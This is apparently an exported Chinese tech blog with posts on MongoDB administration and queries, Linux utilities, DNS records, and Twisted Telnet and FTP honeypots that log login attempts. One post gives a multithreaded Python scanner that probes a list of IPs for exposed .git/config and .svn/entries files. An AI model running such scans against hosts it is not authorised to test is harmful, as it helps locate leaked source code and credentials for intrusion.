3.1.4完成上一步之后再次执行db.runCommand( { removeShard: &quot;shard000&quot; } ),得到如下返回即为成功删除该分片123456&#123; "msg" : "removeshard completed successfully", "state" : "completed", "shard" : "shard0001", "ok" : 1&#125; 3.2均衡器配置3.2.1均衡器的操作由于均衡器工作时会影响性能，通常在操作前关闭均衡器，操作之后再开启均衡器（备份期间要保证均衡过程一定不能运行）1.查看均衡器状态：sh.getBalancerState()2.开启均衡器：sh.setBalancerState(true)3.关闭均衡器：sh.setBalancerState(false)或者sh.stopBalancer() 3.2.2检查均衡锁的状态连接mongos,切换到config库，执行命令，过程如下（也可以通过sh.status()的balancer字段判断）123mongouse configdb.locks.find( &#123; _id : "balancer" &#125; ).pretty() 返回如下信息123456789&#123; "_id" : "balancer", "state" : 0, "who" : "localhost:27017:1469031212:1501674588:Balancer:1603386966", "ts" : ObjectId("578fde70a8fc7b3ad5b2635d"), "process" : "localhost:27017:1469031212:1501674588", "when" : ISODate("2016-07-20T20:26:24.238Z"), "why" : "doing balance round"&#125; 其中state 值为0表明不存在锁；在mongos2.0以后版本,值为2表明存在锁,之前的版本,值为 1 表明存在锁]]></content>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu压缩/解压lz4文件]]></title>
    <url>%2F2016%2F07%2F20%2FUbuntu_lz4%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;lz4压缩算法致力于提高压缩和解压的速度,项目中接触到lz4压缩的文件，这里介绍如何在Ubuntu下进行lz4文件的压缩与解压 0x01安装安装命令如下：1apt-get install liblz4-tool 0x02使用1.快速压缩文件：lz4 test.txt2.解压lz4文件：lz4 -d test.lz43.更多用法，执行lz4 -h如下：123456789101112131415161718192021222324252627Usage : lz4 [arg] [input] [output]input : a filename with no FILE, or when FILE is - or stdin, read standard inputArguments : -1 : Fast compression (default) -9 : High compression -d : decompression (default for .lz4 extension) -z : force compression -f : overwrite output without prompting -h/-H : display help/long help and exitAdvanced arguments : -V : display Version number and exit -v : verbose mode -q : suppress warnings; specify twice to suppress errors too -c : force write to standard output, even if it is the console -t : test compressed file integrity -l : compress using Legacy format (Linux kernel compression) -B# : Block size [4-7](default : 7) -BD : Block dependency (improve compression ratio) -BX : enable block checksum (default:disabled) -Sx : disable stream checksum (default:enabled)Benchmark arguments : -b : benchmark file(s) -i# : iteration loops [1-9](default : 3), benchmark mode only]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB使用语法]]></title>
    <url>%2F2016%2F07%2F11%2FMongoDB_usage%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;经常使用MongoDB，这里整理一下查询语法，第一部分为SQL和MongoDB用法对照，第二部分为Mongo部分高级用法。PS：仅仅记录自己常用的，更高级的还是查看官方文档吧！ 0x01 SQL vs MongoDB语法对应表MongoDB号称最像SQL的非关系数据库，以下就是两者查询语句对应表1.插入语句:12INSERT INTO users (user_id,age,status) VALUES ("bcd001",45,"A" db users insert(&#123;user_id:"bcd001",age:45,status:"A"&#125;) 2.查询语句 2.1 查询所有12SELECT * FROM users db.users.find() 2.2 返回特定字段12SELECT id,user_id,status FROM users db.users.find(&#123;&#125;,&#123;user_id:1,status:1&#125;) 2.3 返回特定字段，且Mongodb不返回”_id”(“_id”默认都是返回的)12SELECT user_id,status FROM usersdb.users.find(&#123;&#125;,&#123;user_id:1,status:1,_id:0&#125;) 2.4 查询status=”A”12SELECT * FROM users WHERE status ="A" db.users.find(&#123;status:"A"&#125;) 2.5 查询status=”A”，限定返回字段user_id,status12SELECT user_id,status FROM users WHERE status ="A"db.users.find(&#123;status:"A"&#125;,&#123;user_id:1,status:1,_id:0&#125;) 2.6 查询status不等于A”12SELECT * FROM users WHERE status !="A"db.users.find(&#123;status:&#123;$ne:"A"&#125;&#125;) 2.7 查询status=”A”且age=5012SELECT * FROM users WHERE status ="A" AND age = 50db.users.find(&#123;status:"A",age:50&#125;) 2.8 查询status=”A”或者age=5012SELECT * FROM users WHERE status ="A" OR age=50db.users.find(&#123;$or:[&#123;status:"A"&#125;,&#123;age:50&#125;]&#125;) 2.9 查询age大于2512SELECT * FROM users WHERE age &gt;25db.users.find(&#123;age:&#123;$gt:25&#125;&#125;) 2.10 查询age小于2512SELECT * FROM users WHERE age&lt;25db.users.find(&#123;age:&#123;$lt:25&#125;&#125;) 2.11 查询age大于25且小于5012SELECT * FROM users WHERE age &gt;25 AND age&lt;=50db.users.find(&#123;age:&#123;$gt:25,$lte:50&#125;&#125;) 2.12 查询包含字符串”bc”（模糊匹配）12SELECT * FROM users WHERE user_id like "%bc%"db.users.find(&#123;user_id:/bc/&#125;) 2.13 查询以”bc”字符串开头12SELECT * FROM users WHERE user_id like "bc%"db.users.find(&#123;user_id:/^bc/&#125;) 2.14 查询status=”A”，并且按照user_id正序排序12SELECT * FROM users WHERE status="A" ORDER BY user_id ASCdb.users.find(&#123;status:"A"&#125;).sort(&#123;user_id:1&#125;) 2.15 查询status=”A”，并且按照user_id逆序排序12SELECT * FROM users WHERE status="A"ORDER BY user_id DESCdb.users.find(&#123;status:"A"&#125;).sort(&#123;user_id:-1&#125;) 2.16 计总数1234SELECT COUNT(*) FROM usersdb.users.count()ordb.users.find().count() 2.17 查询存在user_id的数据总数1234SELECT COUNT(user_id) FROM usersdb.users.count(&#123;user_id:&#123;$exists:true&#125;&#125;)ordb.users.find(&#123;user_id:&#123;$exists:true&#125;&#125;).count() 2.18 查询age大于30的总数1234SELECT COUNT(*) FROM users WHERE age&gt;30db.users.count(&#123;age:&#123;$gt:30&#125;&#125;)ordb.users.find(&#123;age:&#123;$gt:30&#125;&#125;).count() 2.19 查询status字段的所有不同值（常用于得到某字段的取值范围）12SELECT DISTINCT(status) FROM usersdb.users.distinct("status") 2.20 查询第一条数据1234SELECT* FROM users LIMIT1db.users.findOne()ordb.users.find().limit(1) 2.21 查询地10-15条数据12SELECT * FROM users LIMIT 5 SKIP 10db.users.find().limit(5).skip(10) 2.22 显示查询相关的详细信息12EXPLAIN SELECT * FROM users WHERE status ="A"db.users.find(&#123;status:"A"&#125;).explain() 3 更新语句3.1 更新age&gt;25的数据设置status=”c”(注意：MongoDB中如果不指定multi:true则只更新满足要求的第一条数据)12UPDATE users SET status="C" WHERE age&gt;25db.users.update(&#123;age:&#123;$gt:25&#125;&#125;,&#123;$set:&#123;status:"C"&#125;&#125;,&#123;multi:true&#125;) 3.2 更新status=”A”的数据设置每个age加312UPDATE users SET age=age+3 WHERE status="A"db.users.update(&#123;status:"A"&#125;,&#123;$inc:&#123;age:3&#125;&#125;,&#123;mult:true&#125;) 4 删除语句4.1 删除status=”D”的数据12DELETE FROM users WHERE status="D"db.users.remove(&#123;status:"D"&#125;) 4.2 删除user表12DELETE FROM usersdb.users.remove(&#123;&#125;) 0x02 MongoDB特殊语法1 重命名字段名(注：MongoDB更新字段名需要将所有数据重新写一遍，大数据下会耗费大量时间，笔者曾重写10亿级数据花了1周时间)12#重命名user_id为usernamedb.rdns.update(&#123;&#125;, &#123;"$rename":&#123;"user_id" : "user_name"&#125;&#125;,false, true) 2 删除特定字段12#删除age字段db.getCollection('tags').update(&#123;&#125;,&#123;"$unset":&#123;"age":""&#125;&#125;,&#123;multi:true&#125;) 3 获取特定条件的某字段的去重结果值12#获取age大于10的status的去重结果db.users.distinct("status",&#123;"age":&#123;"$gt":10&#125;&#125;) 4 建立索引12#username字段建立索引db.user.ensureIndex(&#123;"username":1&#125;) 5 建立稀疏索引稀疏索引与普通索引的区别在于，不存在该字段的情况下，稀疏索引列表不包含该文档（document），而普通索引列表会包含，值为null12#建立work.address的稀疏索引db.user.ensureIndex(&#123;"work.address":1&#125;,&#123;"sparse":1&#125;) 6 查询不存在某字段的数据12#查询不存在work字段的数据db.user.find(&#123;"work":&#123;"$exists":0&#125;&#125;) 7 查询嵌套字段数据1234567#&#123;"_id" : ObjectId("57125d024a543fd09e73d411"),# "work":&#123;# "address":"北京"# &#125;#&#125;db.user.find(&#123;"work.address":"北京"&#125;) 8 查询数据组（直接查询即可）12345678910#&#123;"_id" : ObjectId("57125d024a543fd09e73d411"),#"protocols" : [ # "https",# "http",# "ftp",# "smtp"# ]#&#125;db.user.find(&#123;"protocols":"http"&#125;) 9 查询_id12#_id大于"57125d024a543fd09e73d411"db.user.find(&#123;"_id":&#123;"$gt":ObjectId("57125d024a543fd09e73d411"&#125;&#125;) 10 忽略大小写查询字符串1db.user.find(&#123;"username":/wangWei/i&#125;) 11 正则表达式查询1db.user.find(&#123;"username":&#123;"$regex":/^ABC/i&#125;&#125;)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python多线程编程之Git、SVN信息泄露]]></title>
    <url>%2F2016%2F07%2F08%2Fpython_Git_SVN%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;一直想学习Python多线程利用，正好利用requests包检测Git和SVN信息泄露 0x01原理&emsp;&emsp;读取IP或者域名地址文件，通过requests包的get请求，返回http包状态为200的URL，为了解决网站错误默认页面返回也是200 OK的情况加入了字符匹配判断。可以根据需要添加功能更强的正则匹配筛选。 0x02代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env python# -*- coding: utf-8 -*-import requestsimport Queueimport threadingurl = ["/.git/config", "/.svn/entries"]fip = open('test_ip.txt', 'r')queueLock = threading.Lock()workQueue = Queue.Queue()thread_num = 30threads = []class MyThread (threading.Thread): def __init__(self, Queue,id): threading.Thread.__init__(self) self.q = Queue self.id = id def run(self): while not workQueue.empty(): get_info(self.q.get())def get_info(ip): for payload in url: target = "http://" + ip + payload print target try: result = requests.get(target, timeout = 5) if result.status_code == 200: if result.text.find('[remote "origin"]') != -1 or result.text.find('http://svn') != -1: queueLock.acquire() ff = open('seccess.txt', 'a+') ff.write(target + '\n') queueLock.release() break except: passdef main(): for ip in fip: workQueue.put(ip.strip()) for i in range(thread_num): thread = MyThread(workQueue,i) thread.start() threads.append(thread) for t in threads: t.join()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Git</tag>
        <tag>SVN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS迭代解析和DNS记录类型及含义]]></title>
    <url>%2F2016%2F06%2F23%2FDNS%2F</url>
    <content type="text"><![CDATA[0x00&emsp;&emsp;最近研究DNS数据，借此机会简单分析DNS解析的过程和DNS记录类型及含义。 0x01 DNS记录类型及含义 记录类型 含义简介 A（Address） 指定域名对应的IPv4地址 AAAA 指定域名对应的IPv6地址 NS（Name Server） 指定该域名由哪个DNS服务器来进行解析 MX（Mail Exchanger） 邮件交换记录，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器 CNAME（Canonical Name ） 别名记录，多个域名映射到同一台计算机（如同一主机提供mail和www服务） TXT 主机名或域名的说明 TTL（Time-To-Live） DNS服务器中保存的时间 PTR 将一个主机地址映射到对应的域名 HINFO 说明映射到特定 DNS 主机名的 CPU 类型和操作系统类型 0x02DNS解析过程如下是DNS迭代解析流程图&emsp;&emsp;1. 客户端向本地DNS服务器发出请求（如：www.jd.com） &emsp;&emsp;2. 本地DNS服务器向根域名服务器发出请求，得到com顶级域名服务器的地址&emsp;&emsp;3. 本地DNS服务器向com顶级域服务器发出请求，得到jd.com权威域名服务器的地址 &emsp;&emsp;4. 本地DNS服务器向jd.com顶级域服务器发出请求，得到www.jd.com的地址&emsp;&emsp;5. 本地DNS服务器返回www.jd.com的ip地址给客户端 0x03 实际操作利用Linux自带的dig +trace选项追踪www.jd.com的DNS解析过程，具体结果如下： 1.向根域名服务器发出请求，得到com顶级域名服务器的地址 2.向com顶级域服务器发出请求，得到jd.com权威域名服务器的地址 3.向jd.com顶级域服务器发出请求，得到www.jd.com的地址 4.返回www.jd.com的ip地址给客户端]]></content>
      <categories>
        <category>协议分析</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB-3.2 安装及认证配置]]></title>
    <url>%2F2016%2F06%2F12%2FMongoDB_install%2F</url>
    <content type="text"><![CDATA[0x00 前言&emsp;&emsp;前段时间学习mongodb,安装mongodb最新版3.2.X,然后安全配置。网上搜索都是低版本的设置，坑太多，写下了做个笔记备用 0x01 安装我的系统是：Ubuntu 14.04看得懂英文的直接参考：mongodb官网安装教程（其实不需要懂英语） 添加key:sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv EA312927 创建mongodb文件清单：echo &quot;deb http://repo.mongodb.org/apt/ubuntu trusty/mongodb-org/3.2 multiverse&quot; | sudo tee /etc/apt/sources.list.d/mongodb-org-3.2.list 更新源sudo apt-get update 若安装最新版：sudo apt-get install -y mongodb-org 若安装指定版本（修改对应版本号）：sudo apt-get install -y mongodb-org=3.2.0 mongodb-org-server=3.2.0 mongodb-org-shell=3.2.0 mongodb-org-mongos=3.2.0 mongodb-org-tools=3.2.0 0x02使用 启动mongo服务：sudo service mongod start 停止mongo服务：sudo service mongod stop 重启mongo服务：sudo service mongod restart 0x03安全配置注：默认情况下mongodb是没有访问验证的，这才导致了很多的未授权访问泄露铭感信息。&emsp;&emsp;打开认证需要先建立用户然后开启认证配置。在mongodb中认证是基于数据库的，新建用户的时候申明他的角色（权限），该用户只有在对应的数据库下才能操作，admin需要先在admin数据库下认证然后切换到其他需要操作的数据库 新建用户NO.1新建管理员用户shell执行： mongo 192.168.1.101 use admin db.createUser({&quot;user&quot;:&quot;你的用户名&quot;,&quot;pwd&quot;:&quot;你的密码&quot;,&quot;roles&quot;:[{role:&quot;root&quot;,db:&quot;admin&quot;}]})注：更加详细的角色配置参考：createUser 和 角色管理 NO.2打开配置文件sudo nano /etc/mongod.conf 编辑mongd.conf文件如下：1234567891011121314151617181920212223242526272829303132333435363738# mongod.conf# for documentation of all options, see:# http://docs.mongodb.org/manual/reference/configuration-options/# Where and how to store data.storage: dbPath: /var/lib/mongodb journal: enabled: true# engine:# mmapv1:# wiredTiger:# where to write logging data.systemLog: destination: file logAppend: true path: /var/log/mongodb/mongod.log# network interfacesnet: port: 27017 bindIp: 192.168.1.101 #绑定ip#processManagement:security: #打开认证 authorization: enabled#operationProfiling:#replication:#sharding:## Enterprise-Only Options: 保存退出 No.3重启mongodb服务sudo service mongod restart注：多执行几次，如果发现 stop 提示** unknown就说明配置文件修改不对，认真核对修改mongod.conf文件即可。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu源码安装PHP MongoDB驱动]]></title>
    <url>%2F2016%2F06%2F10%2FUbuntu_php_MongoDB%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;尝试了几种网上介绍ubuntu系统下PHP MongoDB驱动的安装教程，大多都是说直接pecl安装，然而我的系统并不支持这种安装，只能用源代码安装了，虽说简单，但是也有一些小坎需要注意，记录一下。 0x01安装可以参考官方教程，文件下载地址：Github第一步：linux下可以利用wget下载,1wget https://github.com/mongodb/mongo-php-driver-legacy/archive/master.zip 下载完成解压master.zip文件得到mongo-php-driver-legacy-master(根据实际文件名而定)1unzip master.zip 第二步：编译1234cd mongo-php-driver-legacy-mastersudo ./configuresudo make allsudo make install 第三步：安装配置1.需要把编译生成的文件mongo.so拷贝到php扩展文件的目录mongo.so文件目录为：./modules/mongo.sophp扩展文件目录通过如下命令查看：1php -i | grep extension_dir 输出如下：1extension_dir =&gt; /usr/lib/php5/20121212 =&gt; /usr/lib/php5/20121212 由此得知php扩展文件的路径,执行如下拷贝命令1sudo cp ./modules/mongo.so /usr/lib/php5/20121212 2.添加extension=mongo.so到php.ini文件12345678910111213141516171819202122232425;;;;;;;;;;;;;;;;;;;;;;; Dynamic Extensions ;;;;;;;;;;;;;;;;;;;;;;;extension=mongo.so; If you wish to have an extension loaded automatically, use the following; syntax:;; extension=modulename.extension;; For example, on Windows:;; extension=msql.dll;; ... or under UNIX:;; extension=msql.so;; ... or with a path:;; extension=/path/to/extension/msql.so;; If you only provide the name of the extension, PHP will look for it in its; default extension directory. 注：也可以不用复制，只配置extension=/绝对路径/mongo.so，不推荐该方式（易误删）第四步：测试查看phpinfo信息看到mongo即为成功安装]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux挂载移动硬盘或U盘]]></title>
    <url>%2F2016%2F06%2F06%2FLinux_mount%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;挂载的含义：Linux系统把所有的设备都视为文件，不同的设备文件在根目录（树的根）开始的某个路径之下（树枝），所以要使用设备需要将其指定在特定的路径之下（就像挂载某一树枝上）所以叫挂载。Linux直接插上移动硬盘或U盘是无法使用的，接着我们就自己挂载使用吧。 0x01小白最简单的使用方式 fdisk -l 查看得到自己要挂载的设备名字注：linux下移动硬盘和U盘的文件名都是/dev/sd[a-p]可以看到我的移动硬盘有4个分区（其中system字段值为“W95 Ext’d (LBA)”的是移动硬盘的逻辑分区），然后确定（根据容量或者顺序）我要挂载的设备名/dev/sdb5/ mount 设备名 挂载路径名mount /dev/sdb5/ ./data/注：路径可以是绝对路径 /home/data/,也可以是相对路径 ./data/ 检查是否成功cd ./data/ls看到设备中的文件即挂载成功 0x02 mount命令&emsp;&emsp;在命令行输入：mount -h The command is `mount [-t fstype] something somewhere&apos;. Details found in /etc/fstab may be omitted. mount -a [-t|-O] ... : mount all stuff from /etc/fstab mount device : mount device at the known place mount directory : mount known device here mount -t type dev dir : ordinary mount command Note that one does not really mount a device, one mounts a filesystem (of the given type) found on the device. One can also mount an already visible directory tree elsewhere: mount --bind olddir newdir or move a subtree: mount --move olddir newdir One can change the type of mount containing the directory dir: mount --make-shared dir mount --make-slave dir mount --make-private dir mount --make-unbindable dir One can change the type of all the mounts in a mount subtree containing the directory dir: mount --make-rshared dir mount --make-rslave dir mount --make-rprivate dir mount --make-runbindable dir A device can be given by name, say /dev/hda1 or /dev/cdrom, or by label, using -L label or by uuid, using -U uuid . Other options: [-nfFrsvw] [-o options] [-p passwdfd]. For many more details, say man 8 mount .]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于Twisted的Telnet简单蜜罐]]></title>
    <url>%2F2016%2F06%2F03%2Ftelnet_honeypot%2F</url>
    <content type="text"><![CDATA[0x00 前言&emsp;&emsp;利用Twisted端口绑定，读取socket的输入命令，然后给出预设的输出，此次实现的telnet蜜罐比较简单，就算是编程练习把。 0x01 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# coding:utf-8from twisted.internet.protocol import Factoryfrom twisted.protocols.basic import LineReceiverfrom twisted.internet import reactorimport loggingimport reWELCOME_MSG = 'Welcome to Microsoft Telnet Client 'LOGIN_SUCCESS = '*===============================================================\n\r\Microsoft Telnet Server.\n\r\*===============================================================\n\r'class Telnet(LineReceiver): def __init__(self): self.name = None self.password = None self.state = 'get_name' self.prefix = 'C:\\Users\\Administrator\&gt;' logging.basicConfig(filename='./telnet.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s', datefmt = '%Y-%m-%d %I:%M:%S') def connectionMade(self): self.sendLine(LOGIN_SUCCESS) self.transport.write('login:') def connectionLost(self, line): logging.info("connection closed") self.state = 'get_name' def lineReceived(self, line): if self.state == 'get_name': self.name = line self.state = 'get_pass' self.transport.write('password:') elif self.state == 'get_pass': self.password = line logging.info(self.name +' ' + self.password ) self.state = 'get_command' self.transport.write(self.prefix) else: logging.info("command" + ' ' + line) self.handle_command(line) def handle_command(self, line): command = line.strip().lower() if command.startswith('dir'): self.sendLine("") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; .") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; ..") self.sendLine("2016/04/26 16:52 &lt;DIR&gt; Desktop") self.sendLine("2016/04/11 17:42 &lt;DIR&gt; Documents") self.sendLine("2016/04/11 17:42 &lt;DIR&gt; Downloads") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; Favorites") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; Links") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; Music") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; Pictures") self.sendLine("2016/04/11 17:55 &lt;DIR&gt; Videos") self.sendLine(" 0 File(s) 0 bytes") self.sendLine(" 14 Dir(s) 33,003,470,848 bytes free ") self.sendLine("") self.transport.write(self.prefix) elif command.startswith('whoami'): self.sendLine("win-u5vm2v23fm5\\administrator") self.sendLine("") self.transport.write(self.prefix) elif command.startswith('ipconfig'): self.sendLine("Ethernet adapter 本地连接: ") self.sendLine("Connection-specific DNS Suffix . :") self.sendLine("Link-local IPv6 Address . . . . . : fe80::b424:11e8:941f:6fa3%11") self.sendLine("IPv4 Address. . . . . . . . . . . : 192.168.1.105") self.sendLine("Subnet Mask . . . . . . . . . . . : 255.255.255.0") self.sendLine("Default Gateway . . . . . . . . . : 192.168.1.255.") self.sendLine("") self.transport.write(self.prefix) elif command.startswith('cd'): self.sendLine("Device not ready: I/O Error.") self.sendLine("") self.transport.write(self.prefix) else: self.sendLine("'" + line + "'" " is not recognized as an internal or external command,\n\roperable program or batch file.") self.sendLine("") self.transport.write(self.prefix)class TelnetFactory(Factory): def buildProtocol(self, addr): return Telnet()reactor.listenTCP(233, TelnetFactory())reactor.run() 0x02 结果截图1.连接登录界面：2.命令执行界面：]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Honeypot</tag>
        <tag>Telnet</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Screen-解决Putty链接断开程序终止问题]]></title>
    <url>%2F2016%2F06%2F02%2Fscreen_putty%2F</url>
    <content type="text"><![CDATA[0x01前言&emsp;&emsp;刚开始接触linux，需要putty(ssh)远程连接，执行长时间的程序服务，然而由于网络不稳定，或者突然断电，也或者是手抖了一下连接断开，再次连接后发现之前运行的程序终止。&emsp;&emsp;这时候就需要用到linux下强大的screen程序了。 0x02 安装yum install screen 或者： apt-get install screen 0x03 使用基本使用： ssh连接成功以后，命令行输入screen 得到一个session（出现提示信息直接enter回车即可）, 然后运行你的程序或者其他操作，这时候你就可以放心大胆的做其他的各种断开连接测试， 再次登录运行screen -ls查看session得到id(前面的数字)，然后screen -r id（你的session id）,一切还是原来的样子。 扩展使用：screen命令：screen&emsp;&emsp;创建一个虚拟终端并且登录之screen –ls&emsp;&emsp;列出当前所有虚拟终端screen [-d] -r sessionid&emsp;&emsp;进入指定的虚拟终端screen –x sessionid&emsp;&emsp;不同终端共享一个session 开启screen以后对screen窗口管理：&emsp;&emsp;键盘上键入的信息是直接发送给当前screen窗口必须用其他方式向screen窗口管理器发出命令，默认情况下，screen接收以CTRL+a开始的命令。这种命令形式在screen中叫做键绑定 命令 功能描述 CTRL+a然后c 创建新的窗口 CTRL+a然后n 切换到下一个窗口 CTRL+a然后p 切换到上一个窗口 CTRL+a然后&#124; 纵向分割屏幕 CTRL+a然后s 水平分割屏幕 CTRL+a然后Tab 切换分割的区域 CTRL+a然后” 显示当前所有窗口列表 CTRL+a然后d 暂时离开这个session(不中断) #注：水平/垂直分割屏幕，切换后要先创建窗口（CTRL+a然后c），才能下一步操作 关闭一个终端:&emsp;&emsp;方式1：可以先进入此终端，然后将所有窗口关闭，当所有窗口都关闭的时候，终端自动关闭，并且出现“[screen is terminating]”&emsp;&emsp;方式2：screen –ls ,然后kill +对应的进程号 0x04 屌炸天的实例01:两个putty session共享一个screen，可以在两边相互操作，实时同步显示 02:在一个putty session内，开启多个显示窗口，可以一边运行程序，一边查看日志，还能看其他信息]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux-split命令]]></title>
    <url>%2F2016%2F05%2F30%2FLinux_split%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;当一个几百G的大文件需要分割成多个小文件，Linux下的split命令可以按行、按文件大小分割。 0x01使用split [-bl] filename 生成文件的前缀名 &emsp;&emsp;在Linux命令行输入split –help可以弹出使用信息如下： -a, --suffix-length=N generate suffixes of length N (default 2) --additional-suffix=SUFFIX append an additional SUFFIX to file names. -b, --bytes=SIZE put SIZE bytes per output file -C, --line-bytes=SIZE put at most SIZE bytes of lines per output file -d, --numeric-suffixes[=FROM] use numeric suffixes instead of alphabetic. FROM changes the start value (default 0). -e, --elide-empty-files do not generate empty output files with &apos;-n&apos; --filter=COMMAND write to shell COMMAND; file name is $FILE -l, --lines=NUMBER put NUMBER lines per output file -n, --number=CHUNKS generate CHUNKS output files. See below -u, --unbuffered immediately copy input to output with &apos;-n r/...&apos; --verbose print a diagnostic just before each output file is opened --help display this help and exit --version output version information and exit SIZE is an integer and optional unit (example: 10M is 10*1024*1024). Units are K, M, G, T, P, E, Z, Y (powers of 1024) or KB, MB, ... (powers of 1000). 常用参数介绍： -a 设置切割后文件名的可变范围（默认为2）即xaa-xzz -b 设置按大小分割文件(可以使用K, M, G, T, P, E, Z, Y (powers of 1024) or KB, MB, ... (powers of 1000)) -C 设置每一行的最大bytes -d 将输出文件名可变改为数字模式（未改变-a参数的话，文件名：x00-x99） -e 省略空文件输出 -l 设置按文件行数分割文件 0x02使用实例：1、将文件test.txt按每100M大小分割，并且前缀名为test split -b 100M test.txt test 2、将文件test.txt按每10000行分割，前缀名为test，并设置文件命名为数字 split -l 10000 -d test.txt test]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pymongo-ip 地址 string/int转换]]></title>
    <url>%2F2016%2F05%2F26%2FPymongo_ip_string2int%2F</url>
    <content type="text"><![CDATA[0x00前言&emsp;&emsp;为了使得项目支持IP地址的C段查询，提高查询数据，计划先把IP地址”点分十进制”字符串表示转换为数值表示 0x01 利用inet_aton（）函数：123456def ip_to_int(ip): return struct.unpack('!I', socket.inet_aton(ip))[0]def int_to_ip(ip_int): return socket.inet_ntoa(struct.pack('!L', ip_int)) 0x02 原理分析：IP地址是一个32位的二进制数,为了方便人们记忆，通常被分割为4个“8位二进制数”（也就是4个字节），称这种方式为“点分十进制”。例：IP地址11001010010111010111100000101101点分十进制应该表示为202.93.120.45 ip字符串转换int转换算法是：将ip字符串以“.”分割开为4个段存储于数组a[0],a[1],a[2],a[3](a[0]为左起第一段);转换结果为a[0]&lt;&lt;8*3+a[1]&lt;&lt;8*2+a[2]&lt;&lt;8*1+a[3] ip int转换字符串（点分十进制)转换算法为：i&amp;0x000000ff+’.’+(i&amp;0x0000ff00)&gt;&gt;8+’.’+(i&amp;0x0000ff0000)&gt;&gt;16+’.’+(i&amp;0xff000000)&gt;&gt;24 0x03 pymongo实例：12345678910111213141516171819202122232425262728293031# !/usr/bin/python# -*- coding: utf-8 -*-import socketimport structimport pymongodef ip_to_int(ip): return struct.unpack('!I', socket.inet_aton(ip))[0]def int_to_ip(ip_int): return socket.inet_ntoa(struct.pack('!L', ip_int))def main(): clint = pymongo.MongoClient('127.0.0.1', 27017) db = clint.database_name # 修改为你的库名 #如果需要认证，把下面注释语句打开修改对应用户名密码即可 # db.authenticate('username', 'password') collection = db.collection_name # 修改为你的集合名 for i in collection.find(&#123;&#125;): try: collection.update(&#123;"ip": i["ip"]&#125;, &#123;"$set": &#123;"ip": ip_to_int(i["ip"])&#125;&#125;) except Exception, e: print e print "finished"if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Pymongo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于python Twisted库的Ftp简单蜜罐]]></title>
    <url>%2F2016%2F05%2F17%2Fpython_twisted_ftp_honeypot%2F</url>
    <content type="text"><![CDATA[0x00 前言&emsp;&emsp;最近需要写蜜罐模拟，用python的twisted库实现了一个简单的ftp蜜罐，可以用浏览器登录，收集用户名密码。 0x01具体代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546from twisted.internet.protocol import Factoryfrom twisted.protocols.basic import LineReceiverfrom twisted.internet import reactorimport loggingimport reWELCOME_MSG = '220 (vsFTPd 2.0.5) 'GOODBYE_MSG = '221 Goodbye.'USER_OK_NEED_PASS = '331 Please specify the password.'PLEASE_LOGIN = '530 Please login with USER and PASS.'UNKNOWN_COMMAND = '500 Unknown command.'LOGIN_WITH_USER_FIRST = '503 Login with USER first.'LOGIN_FAIL = '530 Login incorrect.'REQ_ACTN_NOT_TAKEN = '550 Requested action not taken: 'class Ftp(LineReceiver): def __init__(self): self.name = None self.password = None self.state = 'get_name' # logging.basicConfig(filename='./ftp.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s', datefmt = '%m/%d/%Y %I:%M:%S %p') logging.basicConfig(filename='./ftp.log', level=logging.DEBUG, format='%(asctime)s %(levelname)s: %(message)s', datefmt = '%Y-%m-%d %I:%M:%S') def connectionMade(self): self.sendLine(WELCOME_MSG) def connectionLost(self,line): self.sendLine(GOODBYE_MSG) def lineReceived(self, line): if self.state == 'get_name': self.name = line self.state = 'get_pass' self.sendLine(USER_OK_NEED_PASS) elif self.state == 'get_pass': self.password = line logging.info(self.name +' ' + self.password ) self.state = 'get_name' self.sendLine(LOGIN_FAIL)class 